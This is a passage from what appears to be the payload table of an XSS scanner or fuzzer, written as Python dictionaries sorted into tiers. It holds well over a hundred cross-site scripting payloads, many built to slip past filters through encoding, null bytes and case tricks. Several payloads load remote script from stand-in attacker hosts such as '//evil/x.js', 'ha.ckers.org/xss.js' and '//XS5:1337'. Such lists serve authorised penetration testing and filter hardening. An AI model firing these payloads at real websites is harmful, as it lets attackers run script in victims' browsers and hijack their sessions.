    {"id":"t4_body_hash",     "pl":'<body onhashchange=alert(1)><a href=#x>click this!#x', "tier":4,"type":"html"},
    {"id":"t4_menu_show",     "pl":'<menu id=x contextmenu=x onshow=alert(1)>right click me!', "tier":4,"type":"html"},

    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    # TIER 5 --- advanced / polyglot / obfuscated JS call
    # Handles tight WAF rules, multiple reflection contexts at once.
    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    # Polyglot --- works in HTML, attr, JS, URL contexts simultaneously
    {"id":"t5_poly",          "pl":"jaVasCript:/*--></title></style></textarea></script><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",'tier':5,"type":"poly"},
    {"id":"t5_gif_poly",      "pl":"GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;", "tier":5,"type":"poly"},
    # Comment-splitting (break keyword filters that block <script>)
    {"id":"t5_comment",       "pl":'<scr<!---->ipt>alert(1)</scr<!---->ipt>',        "tier":5,"type":"html"},
    # javascript: protocol in various elements
    {"id":"t5_a_href",        "pl":'<a href=javascript:alert(1)>click',              "tier":5,"type":"html"},
    {"id":"t5_iframe_js",     "pl":'<iframe src=javascript:alert(1)>',               "tier":5,"type":"html"},
    {"id":"t5_embed_js",      "pl":'<embed src=javascript:alert(1)>',                "tier":5,"type":"html"},
    {"id":"t5_form_js",       "pl":'<form action=javascript:alert(1)><input type=submit>', "tier":5,"type":"html"},
    {"id":"t5_form_btn",      "pl":'<form><button formaction=javascript:alert(1)>click', "tier":5,"type":"html"},
    {"id":"t5_form_input",    "pl":'<form><input formaction=javascript:alert(1) type=submit value=click>', "tier":5,"type":"html"},
    {"id":"t5_form_img",      "pl":'<form><input formaction=javascript:alert(1) type=image value=click>', "tier":5,"type":"html"},
    {"id":"t5_obj_data",      "pl":'<object data=javascript:alert(1)>',              "tier":5,"type":"html"},
    {"id":"t5_math_href",     "pl":'<math><brute href=javascript:alert(1)>click',    "tier":5,"type":"html"},
    {"id":"t5_isindex",       "pl":'<isindex action=javascript:alert(1) type=submit value=click>', "tier":5,"type":"html"},
    {"id":"t5_isidx_form",    "pl":'<isindex formaction=javascript:alert(1) type=submit value=click>', "tier":5,"type":"html"},
    # SVG xlink
    {"id":"t5_svg_xlink",     "pl":'<svg><script xlink:href=data:,alert(1) />',      "tier":5,"type":"html"},
    {"id":"t5_math_xlink",    "pl":'<math><brute xlink:href=javascript:alert(1)>click', "tier":5,"type":"html"},
    {"id":"t5_svg_animate",   "pl":'<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>', "tier":5,"type":"html"},
    # data: URI script loading
    {"id":"t5_script_data1",  "pl":'<script src="data:&comma;alert(1)//',            "tier":5,"type":"html"},
    {"id":"t5_script_data2",  "pl":'"><script src=data:&comma;alert(1)//',            "tier":5,"type":"html"},
    # Obfuscated JS calls (no parens, unicode, base36, array tricks)
    {"id":"t5_backtick",      "pl":"alert`1`",                                        "tier":5,"type":"js"},
    {"id":"t5_parens",        "pl":"(alert)(1)",                                      "tier":5,"type":"js"},
    {"id":"t5_a_eq",          "pl":"a=alert,a(1)",                                    "tier":5,"type":"js"},
    {"id":"t5_find",          "pl":"[1].find(alert)",                                 "tier":5,"type":"js"},
    {"id":"t5_bracket",       "pl":"top[\"al\"+\"ert\"](1)",                          "tier":5,"type":"js"},
    {"id":"t5_regex",         "pl":"top[/al/.source+/ert/.source](1)",                "tier":5,"type":"js"},
    {"id":"t5_unicode",       "pl":"al\\u0065rt(1)",                                  "tier":5,"type":"js"},
    {"id":"t5_octal",         "pl":"top['al\\145rt'](1)",                             "tier":5,"type":"js"},
    {"id":"t5_hex_esc",       "pl":"top['al\\x65rt'](1)",                             "tier":5,"type":"js"},
    {"id":"t5_base36",        "pl":"top[8680439..toString(30)](1)",                   "tier":5,"type":"js"},
    {"id":"t5_url_hash",      "pl":"eval(URL.slice(-8))>#alert(1)",                   "tier":5,"type":"js"},
    {"id":"t5_loc_hash",      "pl":"eval(location.hash.slice(1)>#alert(1)",           "tier":5,"type":"js"},
    # Touch / mobile events
    {"id":"t5_touch_start",   "pl":'<html ontouchstart=alert(1)>',                    "tier":5,"type":"html"},
    {"id":"t5_touch_end",     "pl":'<html ontouchend=alert(1)>',                      "tier":5,"type":"html"},
    {"id":"t5_touch_move",    "pl":'<html ontouchmove=alert(1)>',                     "tier":5,"type":"html"},
    {"id":"t5_orient",        "pl":'<body onorientationchange=alert(1)>',             "tier":5,"type":"html"},
    # Setinterval / persistent XSS probe
    {"id":"t5_setinterval",   "pl":'<svg onload=setInterval(function(){with(document)body.appendChild(createElement(\'script\')).src=\'//XS5:1337\'},0)>', "tier":5,"type":"html"},
    # Tabindex-based focus triggers (common in sanitized but tabindex-allowed contexts)
    {"id":"t5_tab_focus",     "pl":'<a id=x tabindex=1 onfocus=alert(1)></a>',        "tier":5,"type":"attr"},
    {"id":"t5_tab_focusin",   "pl":'<a id=x tabindex=1 onfocusin=alert(1)></a>',      "tier":5,"type":"attr"},
    # Body events that trigger without user interaction
    {"id":"t5_body_msg",      "pl":'<body onmessage=alert(1)>',                       "tier":5,"type":"html"},
    {"id":"t5_body_popstate", "pl":'<body onpopstate=alert(1)>',                      "tier":5,"type":"html"},
    {"id":"t5_body_wheel",    "pl":'<body onwheel=alert(1)>',                         "tier":5,"type":"html"},
    {"id":"t5_body_unload",   "pl":'<body onunhandledrejection=alert(1)><script>fetch(\'//xyz\')</script>', "tier":5,"type":"html"},
    # link/base injection
    {"id":"t5_link_import",   "pl":'<link rel=import href="data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;', "tier":5,"type":"html"},
    {"id":"t5_base",          "pl":'<base href=//0>',                                 "tier":5,"type":"html"},
    # innerHTML location.hash
    {"id":"t5_inner_hash",    "pl":'innerHTML=location.hash>#<script>alert(1)</script>', "tier":5,"type":"js"},
    # Audio/video with valid src
    {"id":"t5_audio_pause",   "pl":'<audio autoplay controls onpause=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>', "tier":5,"type":"html"},
    {"id":"t5_audio_play",    "pl":'<audio autoplay onplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>', "tier":5,"type":"html"},
    {"id":"t5_audio_canplay", "pl":'<audio oncanplay=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>', "tier":5,"type":"html"},
    {"id":"t5_audio_oserr",   "pl":'<audio src/onerror=alert(1)>',                    "tier":5,"type":"html"},
    # Additional body event that auto-fires
    {"id":"t5_body_afprint",  "pl":'<body onafterprint=alert(1)>',                    "tier":5,"type":"html"},
    {"id":"t5_body_bfprint",  "pl":'<body onbeforeprint=alert(1)>',                   "tier":5,"type":"html"},
    {"id":"t5_body_bfunload", "pl":"<body onbeforeunload=\"location='javascript:alert(1)'\">", "tier":5,"type":"html"},
    # Script base64/hash loader
    {"id":"t5_script_b64",    "pl":'<script/src="data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)', "tier":5,"type":"html"},

    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    # TIER 4 EXTRA --- encoding/null-byte/whitespace bypass (from xssvector list)
    # Null bytes, tab/CR/LF in attribute names, slash separators, quote tricks
    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    # Null-byte between attr name and = (IE, Safari)
    {"id":"t4x_null_eq",       "pl":'<img src=1 onerror\x00=alert(0) />',            "tier":4,"type":"html"},
    # Null-byte between = and JS value (IE)
    {"id":"t4x_null_val",      "pl":'<img src=1 onerror=\x00alert(0) />',            "tier":4,"type":"html"},
    # Slash instead of whitespace (all browsers)
    {"id":"t4x_slash_sep",     "pl":'<img/src=1/onerror=alert(0)>',                  "tier":4,"type":"html"},
    # Vertical tab instead of whitespace (IE, Safari)
    {"id":"t4x_vtab",          "pl":'<img\x0bsrc=1\x0bonerror=alert(0)>',           "tier":4,"type":"html"},
    # Quote tricks: single then double (Safari)
    {"id":"t4x_quote_trick",   "pl":'<img src=1\'onerror=\'alert(0)\'>',             "tier":4,"type":"html"},
    # No space at all before onerror
    {"id":"t4x_nospace_err",   "pl":'<img src=1onerror=alert(0)>',                   "tier":4,"type":"html"},
    # Extra < before script (IE, Firefox, Chrome, Safari)
    {"id":"t4x_dbl_lt",        "pl":'<<script>alert(0)</script>',                    "tier":4,"type":"html"},
    # No closing > needed (IE, Firefox, Chrome, Safari)
    {"id":"t4x_no_gt",         "pl":'<img src=1 onerror=alert(0) <',                 "tier":4,"type":"html"},
    # IMG tab-split javascript: protocol
    {"id":"t4x_img_tab",       "pl":'<IMG SRC="jav\tascript:alert(\'XSS\');">',      "tier":4,"type":"html"},
    # IMG newline-split javascript: protocol
    {"id":"t4x_img_nl",        "pl":'<IMG SRC="jav&#x0A;ascript:alert(\'XSS\');">',  "tier":4,"type":"html"},
    # IMG CR-split javascript: protocol
    {"id":"t4x_img_cr",        "pl":'<IMG SRC="jav&#x0D;ascript:alert(\'XSS\');">',  "tier":4,"type":"html"},
    # IMG space + &#14; padding before javascript:
    {"id":"t4x_img_chr14",     "pl":'<IMG SRC=" &#14;  javascript:alert(\'XSS\');">',"tier":4,"type":"html"},
    # IMG with triple empty quotes (IE quirk)
    {"id":"t4x_img_triplequot","pl":'<IMG """><SCRIPT>alert("XSS")</SCRIPT>">',      "tier":4,"type":"html"},
    # ScRiPt case mangling classic
    {"id":"t4x_scr_case",      "pl":'<ScRiPt>alert(1)</sCriPt>',                     "tier":4,"type":"html"},
    {"id":"t4x_scr_case2",     "pl":'<sCrIpt>alert(1)</ScRipt>',                     "tier":4,"type":"html"},
    # Style onerror expression (IE7)
    {"id":"t4x_style_expr",    "pl":'<style/onload=prompt(\'XSS\')>',                "tier":4,"type":"html"},
    # CSS expression in style attr (IE)
    {"id":"t4x_css_expr",      "pl":'<div style="width:expression(alert(1))">',      "tier":4,"type":"html"},
    # CSS expression backslash (IE)
    {"id":"t4x_css_bs",        "pl":'<style>body{background-color:expression\\(alert(1))}</style>', "tier":4,"type":"html"},
    # IMG SRC entity-encoded javascript: (all entities)
    {"id":"t4x_img_ent",       "pl":'<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>', "tier":4,"type":"html"},
    # IMG SRC octal-encoded javascript:
    {"id":"t4x_img_oct",       "pl":'<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>', "tier":4,"type":"html"},
    # IMG SRC hex-encoded javascript:
    {"id":"t4x_img_hex",       "pl":'<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>', "tier":4,"type":"html"},
    # BODY ONLOAD!#$% exotic char injection (IE/FF/Chrome/Safari)
    {"id":"t4x_body_exotic",   "pl":'<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("XSS")>', "tier":4,"type":"html"},
    # iframe tab-obfuscated javascript:
    {"id":"t4x_iframe_tab",    "pl":'<iframe src=j\ta\tv\ta\ts\tc\tr\ti\tp\tt:alert(1)></iframe>', "tier":4,"type":"html"},
    # IMG JaVaScRiPt case mix
    {"id":"t4x_img_jcase",     "pl":'<IMG SRC=JaVaScRiPt:alert(\'XSS\')>',          "tier":4,"type":"html"},
    # vbscript msgbox (IE)
    {"id":"t4x_vbscript",      "pl":'<IMG SRC=\'vbscript:msgbox("XSS")\'>',          "tier":4,"type":"html"},
    # iMg VBS onerror (IE)
    {"id":"t4x_img_vbs",       "pl":'<iMg srC=1 lAnGuAGE=VbS oNeRroR=mSgbOx(1)>',  "tier":4,"type":"html"},
    # Split script via document.write
    {"id":"t4x_docwrite_split","pl":'<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>', "tier":4,"type":"html"},
    # META refresh to javascript:
    {"id":"t4x_meta_js",       "pl":'<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert(1)">', "tier":4,"type":"html"},
    # META refresh to data: base64
    {"id":"t4x_meta_b64",      "pl":'<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">', "tier":4,"type":"html"},
    # DIV background-image javascript:
    {"id":"t4x_div_bg",        "pl":'<DIV STYLE="background-image: url(javascript:alert(\'XSS\'))">',  "tier":4,"type":"html"},
    # DIV width expression (IE)
    {"id":"t4x_div_expr",      "pl":'<DIV STYLE="width: expression(alert(\'XSS\'));">',                "tier":4,"type":"html"},
    # STYLE @import javascript:
    {"id":"t4x_import_js",     "pl":'<STYLE>@im\\port\'\\ja\\vasc\\ript:alert("XSS")\';</STYLE>',     "tier":4,"type":"html"},
    # XSS style expression
    {"id":"t4x_xss_expr",      "pl":'<XSS STYLE="xss:expression(alert(\'XSS\'))">',                   "tier":4,"type":"html"},
    # IMG STYLE expression with comment bypass
    {"id":"t4x_img_style_cmt", "pl":'<IMG STYLE="xss:expr/*XSS*/ession(alert(\'XSS\'))">',            "tier":4,"type":"html"},
    # TABLE BACKGROUND javascript:
    {"id":"t4x_table_bg",      "pl":'<TABLE BACKGROUND="javascript:alert(\'XSS\')">',                 "tier":4,"type":"html"},
    # FRAMESET javascript:
    {"id":"t4x_frameset",      "pl":'<FRAMESET><FRAME SRC="javascript:alert(\'XSS\');"></FRAMESET>',   "tier":4,"type":"html"},
    # BGSOUND javascript:
    {"id":"t4x_bgsound",       "pl":'<BGSOUND SRC="javascript:alert(\'XSS\');">',                     "tier":4,"type":"html"},
    # LINK stylesheet javascript:
    {"id":"t4x_link_js",       "pl":'<LINK REL="stylesheet" HREF="javascript:alert(\'XSS\');">',       "tier":4,"type":"html"},
    # BASE href javascript:
    {"id":"t4x_base_js",       "pl":'<BASE HREF="javascript:alert(\'XSS\');//">',                     "tier":4,"type":"html"},
    # INPUT IMAGE SRC javascript:
    {"id":"t4x_input_img",     "pl":'<INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');">',           "tier":4,"type":"html"},
    # isindex formaction
    {"id":"t4x_isindex_fa",    "pl":'<isindex formaction="javascript:alert(1)" type=submit value=click>', "tier":4,"type":"html"},
    # object data base64 HTML
    {"id":"t4x_obj_b64",       "pl":'<object data=data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+></object>', "tier":4,"type":"html"},
    # embed src base64
    {"id":"t4x_embed_b64",     "pl":'<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">',  "tier":4,"type":"html"},
    # iframe data: HTML
    {"id":"t4x_iframe_data",   "pl":'<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>', "tier":4,"type":"html"},
    # comment then script (all browsers)
    {"id":"t4x_cmt_script",    "pl":'<!-- --><script>alert(1);</script><!-- -->',     "tier":4,"type":"html"},
    # style then script (all browsers)
    {"id":"t4x_style_then_scr","pl":'<style><img src="</style><img src=x onerror=alert(123)//">',  "tier":4,"type":"html"},
    # comment then img (all browsers)
    {"id":"t4x_cmt_img",       "pl":'<!--<img src="--><img src=x onerror=alert(123)//">',          "tier":4,"type":"html"},
    # CDATA script split (XML context)
    {"id":"t4x_cdata_split",   "pl":'<xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert(\'XSS\');">]]></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>', "tier":4,"type":"html"},
    # input onfocus autofocus (no interaction needed)
    {"id":"t4x_input_af_focus","pl":'<input onfocus=write(XSS) autofocus>',           "tier":4,"type":"html"},
    # input onblur pair
    {"id":"t4x_input_blur",    "pl":'<input onblur=write(XSS) autofocus><input autofocus>', "tier":4,"type":"html"},
    # select onfocus eval fromCharCode
    {"id":"t4x_select_eval",   "pl":'<select onfocus=javascript:eval(String[\'fromCharCode\'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>', "tier":4,"type":"attr"},
    # textarea onfocus eval
    {"id":"t4x_textarea_eval", "pl":'<textarea onfocus=javascript:eval(String[\'fromCharCode\'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>', "tier":4,"type":"attr"},
    # keygen onfocus eval
    {"id":"t4x_keygen_eval",   "pl":'<keygen onfocus=javascript:eval(String[\'fromCharCode\'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>', "tier":4,"type":"attr"},
    # video poster javascript: (eval fromCharCode)
    {"id":"t4x_video_poster",  "pl":'<video poster=javascript:eval(String[\'fromCharCode\'](97,108,101,114,116,40,39,120,115,115,39,41,32))//>', "tier":4,"type":"html"},
    # video source onerror eval
    {"id":"t4x_video_src_err", "pl":'<video><source onerror="javascript:eval(String[\'fromCharCode\'](97,108,101,114,116,40,39,120,115,115,39,41,32))">',  "tier":4,"type":"html"},
    # body onscroll eval + br flood
    {"id":"t4x_body_scroll_ev","pl":'<body onscroll=alert(XSS)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>', "tier":4,"type":"html"},
    # form button formaction javascript:
    {"id":"t4x_btn_formact",   "pl":'<form id="test"/><button form="test" formaction="javascript:alert(123)">X', "tier":4,"type":"html"},
    # frameset onload
    {"id":"t4x_frameset_load", "pl":'<frameset onload=alert(123)>',                   "tier":4,"type":"html"},

    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    # TIER 5 EXTRA --- advanced encoding, protocol, obfuscation, Unicode tricks
    # Payloads that require multi-step decoding or rare browser behaviours
    # ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
    # String.fromCharCode execution
    {"id":"t5x_sfc_script",    "pl":'<SCRIPT>String.fromCharCode(97,108,101,114,116,40,49,41)</SCRIPT>', "tier":5,"type":"js"},
    {"id":"t5x_sfc_img",       "pl":'<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>', "tier":5,"type":"html"},
    # eval(String['fromCharCode'](...)) via input autofocus
    {"id":"t5x_sfc_eval_af",   "pl":'<input onfocus=javascript:eval(String[\'fromCharCode\'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>', "tier":5,"type":"attr"},
    # UTF-7 encoded payload
    {"id":"t5x_utf7",          "pl":'+ADw-script+AD4-alert(document.location)+ADw-/script+AD4-', "tier":5,"type":"html"},
    # Double-percent encoded
    {"id":"t5x_dbl_pct",       "pl":'%253cscript%253ealert(1)%253c/script%253e',      "tier":5,"type":"html"},
    # Unicode fullwidth <> (%uff1c %uff1e)
    {"id":"t5x_unicode_fw",    "pl":'%uff1cscript%uff1ealert(1)%uff1c/script%uff1e',  "tier":5,"type":"html"},
    # Overlong UTF-8 < = %C0%BC
    {"id":"t5x_overlong",      "pl":'%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE', "tier":5,"type":"html"},
    # Non-alphanumeric JS (JSF*ck style, partial)
    {"id":"t5x_jsfuck_alert",  "pl":'<script>({0:#0=alert/#0#/#0#(0)})</script>',    "tier":5,"type":"js"},
    # JS: eval chain obfuscation
    {"id":"t5x_eval_chain",    "pl":'<script>a="get";b="URL(\"";c="javascript:";d="alert(\'XSS\');\")";eval(a+b+c+d);</script>', "tier":5,"type":"js"},
    # Regex source concat
    {"id":"t5x_regex_src",     "pl":'<SCRIPT>a=/XSS/;alert(a.source)</SCRIPT>',       "tier":5,"type":"js"},
    # SVG script xlink href data:
    {"id":"t5x_svg_xlink_data","pl":'<svg><script xlink:href="data:,alert(1)">',      "tier":5,"type":"html"},
    # math xlink href jsfiddle (external load probe)
    {"id":"t5x_math_xlink_jf", "pl":'<math><a xlink:href="//jsfiddle.net/t846h/">click', "tier":5,"type":"html"},
    # embed SVG base64 allowscriptaccess
    {"id":"t5x_embed_svg_b64", "pl":'<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlhTUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>', "tier":5,"type":"html"},
    # object data base64 SVG
    {"id":"t5x_obj_svg_b64",   "pl":'<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>', "tier":5,"type":"html"},
    # iframe srcdoc body onload
    {"id":"t5x_srcdoc_body",   "pl":'<iframe srcdoc=\'&lt;body onload=prompt&lpar;1&rpar;&gt;\'>',  "tier":5,"type":"html"},
    # iframe NewLine/Tab obfuscated javascript: src
    {"id":"t5x_iframe_nltab",  "pl":'<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t%28&NewLine;1%29></iframe>', "tier":5,"type":"html"},
    # a href data: base64 SVG/onload
    {"id":"t5x_a_data_b64",    "pl":'<a href="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+">X</a>', "tier":5,"type":"html"},
    # meta refresh url=;URL=javascript: (double URL IE)
    {"id":"t5x_meta_dbl_url",  "pl":'<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:alert(\'XSS\');">', "tier":5,"type":"html"},
    # window[] bracket notation
    {"id":"t5x_win_bracket",   "pl":'<script>window[\'alert\'](0)</script>',           "tier":5,"type":"js"},
    # parent/self/top bracket
    {"id":"t5x_parent_br",     "pl":'<script>parent[\'alert\'](1)</script>',           "tier":5,"type":"js"},
    {"id":"t5x_top_br",        "pl":'<script>top[\'alert\'](3)</script>',              "tier":5,"type":"js"},
    # Split alert across lang attrs
    {"id":"t5x_split_lang",    "pl":'<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>', "tier":5,"type":"html"},
    # html5 video meta onloadedmetadata
    {"id":"t5x_video_meta",    "pl":'<video src="http://www.w3schools.com/html5/movie.ogg" onloadedmetadata="alert(1)" />', "tier":5,"type":"html"},
    # blah style expression (IE non-existent element)
    {"id":"t5x_blah_expr",     "pl":'<blah style="blah:expression(alert(1))" />',      "tier":5,"type":"html"},
    # CSS z:exp/**/res/**/sion (IE, comment bypass)
    {"id":"t5x_css_cmt_expr",  "pl":'<div style="z:exp/*anything*/res/*here*/sion(alert(1))" />', "tier":5,"type":"html"},
    # two-stage eval(location.hash)
    {"id":"t5x_hash_eval_scr", "pl":'<script>eval(location.hash.slice(1))</script>',  "tier":5,"type":"js"},
    # two-stage innerHTML=location.hash
    {"id":"t5x_inner_hash2",   "pl":'<script>innerHTML=location.hash</script>#<script>alert(1)</script>', "tier":5,"type":"js"},
    # script for=document event=onreadystatechange (IE)
    {"id":"t5x_scr_for_evt",   "pl":'<script for=document event=onreadystatechange>alert(1)</script>', "tier":5,"type":"html"},
    # img src + onerror jQuery getScript (external load)
    {"id":"t5x_jquery_gs",     "pl":'<img src=1 onerror=jQuery.getScript("//evil/x.js")>', "tier":5,"type":"html"},
    # img src + onerror createElement script (classic DOM write)
    {"id":"t5x_dom_script",    "pl":'<img src=x onerror=document.body.appendChild(document.createElement(\'script\')).src=\'//evil/x.js\'>', "tier":5,"type":"html"},
    # textarea autofocus write
    {"id":"t5x_textarea_write","pl":'<textarea id=ta onfocus="write(\'<script>alert(1)</script>\')" autofocus></textarea>', "tier":5,"type":"html"},
    # iframe src 404 + onload write (DOM clobbering context)
    {"id":"t5x_iframe_404_wrt","pl":'<iframe src="404" onload="write(\'<script>alert(1)<\\/script>\')"></iframe>', "tier":5,"type":"html"},
    # SVG onload xmlns
    {"id":"t5x_svg_xmlns_load","pl":'<svg onload="javascript:alert(123)" xmlns="#"></svg>',  "tier":5,"type":"html"},
    # iframe xmlns javascript:
    {"id":"t5x_iframe_xmlns",  "pl":'<iframe xmlns="#" src="javascript:alert(1)"></iframe>',  "tier":5,"type":"html"},
    # object data javascript: unicode
    {"id":"t5x_obj_js_uni",    "pl":'<object data=javascript:\u0061\u006c\u0065\u0072\u0074(1)>',  "tier":5,"type":"html"},
    # form action javascript: + input submit
    {"id":"t5x_form_act_js",   "pl":'<form action=javascript:alert(1)><input type=submit>',        "tier":5,"type":"html"},
    # isindex action javascript:
    {"id":"t5x_isindex_act",   "pl":'<isindex action="javascript:alert(1)" type=image>',           "tier":5,"type":"html"},
    # script crypto (Firefox old)
    {"id":"t5x_crypto",        "pl":'<script>crypto.generateCRMFRequest(\'CN=0\',0,0,null,\'alert(1)\',384,null,\'rsa-dual-use\')</script>', "tier":5,"type":"js"},
    # SVG script ? (Opera)
    {"id":"t5x_svg_scr_q",     "pl":'<svg><script ?>alert(1)',                         "tier":5,"type":"html"},
    # Non-alphanumeric JS crazy (partial jsfuck)
    {"id":"t5x_noalpha_js",    "pl":'<script>$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$};$.$$=$.$+(!""+"")[0]+$._+$.$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_+"(1)"+"\"")())()</script>', "tier":5,"type":"js"},
    # a href about: script (IE)
    {"id":"t5x_about_script",  "pl":'<a href="about:<script>alert(1);</script>">X</a>', "tier":5,"type":"html"},
    # div binding: url() (Firefox old)
    {"id":"t5x_div_binding",   "pl":'<DIV style="binding: url(javascript:alert(1));">', "tier":5,"type":"html"},
    # style onload with HTML comment bypass
    {"id":"t5x_style_cmt_scr", "pl":'<style><!--</style><script>alert(1);//--></script>', "tier":5,"type":"html"},
    # plaintext onmouseover
    {"id":"t5x_plaintext_om",  "pl":'</plaintext\\></|\\><plaintext/onmouseover=prompt(1)', "tier":5,"type":"attr"},
    # ScRipT 5-0*3+9/3 (Opera eval)
    {"id":"t5x_scr_expr_opera","pl":'<ScRipT 5-0*3+9/3=>prompt(1)</ScRipT giveanswerhere=?', "tier":5,"type":"html"},
    # blink onmouseover (Firefox/Opera)
    {"id":"t5x_blink_om",      "pl":'<blink onmouseover=prompt(1)>OnMouseOver</blink>',   "tier":5,"type":"attr"},
    # marquee onstart javascript: (encoded)
    {"id":"t5x_marquee_enc",   "pl":'<marquee onstart=\'javascript:alert&#x28;1&#x29;\'>^__^', "tier":5,"type":"html"},
    # img src @ + onerror prompt (Opera/FF)
    {"id":"t5x_img_at_err",    "pl":'<img/src=@&#32;&#13; onerror = prompt(\'1\')>',      "tier":5,"type":"html"},
    # iframe %00 src Tab javascript:
    {"id":"t5x_iframe_null",   "pl":'<iframe %00 src="&Tab;javascript:prompt(1)&Tab;"%00>', "tier":5,"type":"html"},
    # iframe /%00/ src javaScript:
    {"id":"t5x_iframe_pnull",  "pl":'<iframe/%00/ src=javaSCRIPT:alert(1)',               "tier":5,"type":"html"},
    # svg style font-family iframe/onload
    {"id":"t5x_svg_style_ff",  "pl":'<svg><style>{font-family\'<iframe/onload=confirm(1)>\'',  "tier":5,"type":"html"},
    # input onmouseover javaScript colon entity
    {"id":"t5x_input_js_ent",  "pl":'<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"', "tier":5,"type":"attr"},
    # sVg scRipt %00 alert Opera
    {"id":"t5x_svg_null_opera","pl":'<sVg><scRipt %00>alert&lpar;1&rpar; {Opera}',        "tier":5,"type":"html"},
    # img src %00 onerror=this.onerror
    {"id":"t5x_img_self_err",  "pl":'<img/src=`%00` onerror=this.onerror=confirm(1)',     "tier":5,"type":"html"},
    # form isindex formaction javascript: entity
    {"id":"t5x_isidx_fa_ent",  "pl":'<form><isindex formaction="javascript&colon;confirm(1)"', "tier":5,"type":"html"},
    # img %00 NewLine onerror
    {"id":"t5x_img_nl_null",   "pl":'<img src=`%00`&NewLine; onerror=alert(1)&NewLine;',  "tier":5,"type":"html"},
    # script tab src (external load through tab obfuscation)
